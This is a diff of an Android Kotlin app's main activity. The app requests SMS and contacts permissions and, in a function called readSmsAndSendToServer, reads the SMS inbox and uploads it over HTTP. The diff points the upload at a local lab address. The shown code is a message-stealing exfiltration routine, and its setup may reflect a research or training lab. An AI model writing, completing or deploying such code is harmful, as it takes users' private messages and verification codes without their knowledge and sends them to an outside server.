@@ -11,10 +11,7 @@ import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import android.os.Environment
 import okhttp3.*
-import java.io.File
-import java.io.FileWriter
 import java.io.IOException
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 
@@ -28,7 +25,7 @@ class MainActivity : AppCompatActivity() {
         ActivityResultContracts.RequestPermission()
     ) { isGranted: Boolean ->
         if (isGranted) {
-            requestContactsPermission()
+            requestContactsPermission();
         } else {
             Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show()
         }
@@ -58,7 +55,7 @@ class MainActivity : AppCompatActivity() {
         )
 
         if (smsPermission == PackageManager.PERMISSION_GRANTED) {
-            requestContactsPermission()
+            requestContactsPermission();
         } else {
             requestSmsPermissionLauncher.launch(Manifest.permission.READ_SMS)
         }
@@ -102,7 +99,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun readSmsAndSendToServer() {
-        val url = "http://ip:8080/upload" // Replace with your server's URL
+        val url = "http://192.168.56.1:8080/upload" // Replace with your server's URL
         val messages = mutableListOf<TextMessage>()
 
         val uri = Uri.parse("content://sms/inbox")
